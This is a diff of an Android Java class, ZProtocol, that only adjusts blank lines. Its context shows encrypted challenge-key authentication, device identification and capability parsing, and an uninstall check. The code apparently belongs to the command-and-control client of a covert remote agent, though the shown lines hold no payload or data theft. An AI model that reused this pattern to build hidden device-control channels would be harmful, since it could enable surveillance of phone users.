@@ -37,7 +37,6 @@ import com.android.service.util.WChar;
  * The Class ZProtocol.
  */
 public class ZProtocol extends Protocol {
-
 	/** The debug. */
 	private static final String TAG = "ZProtocol"; //$NON-NLS-1$
 	/** The Constant SHA1LEN. */
@@ -71,6 +70,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (ZProtocol): " + e); //$NON-NLS-1$
 			}
+
 			if (Cfg.DEBUG) {
 				Check.log(e);
 			}
@@ -102,6 +102,7 @@ public class ZProtocol extends Protocol {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Warn: " + "Uninstall detected, no need to continue"); //$NON-NLS-1$ //$NON-NLS-2$
 				}
+
 				return true;
 			}
 
@@ -125,6 +126,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
+			
 			return false;
 		} catch (final ProtocolException e) {
 			if (Cfg.EXCEPTION) {
@@ -134,6 +136,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
+			
 			return false;
 		} catch (final CommandException e) {
 			if (Cfg.EXCEPTION) {
@@ -143,6 +146,7 @@ public class ZProtocol extends Protocol {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
 			}
+			
 			return false;
 		} finally {
 			transport.close();
@@ -162,13 +166,14 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Authentication *****"); //$NON-NLS-1$
 		}
+		
 		// key init
 		cryptoConf.makeKey(Keys.self().getChallengeKey());
 
 		random.nextBytes(Kd);
 		random.nextBytes(Nonce);
-		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
 
+		final byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication());
 		final byte[] response = transport.command(cypherOut);
 
 		return parseAuthentication(response);
@@ -187,8 +192,10 @@ public class ZProtocol extends Protocol {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: ***** Identification *****"); //$NON-NLS-1$
 		}
+		
 		final byte[] response = command(Proto.ID, forgeIdentification());
 		final boolean[] capabilities = parseIdentification(response);
+		
 		return capabilities;
 	}
 
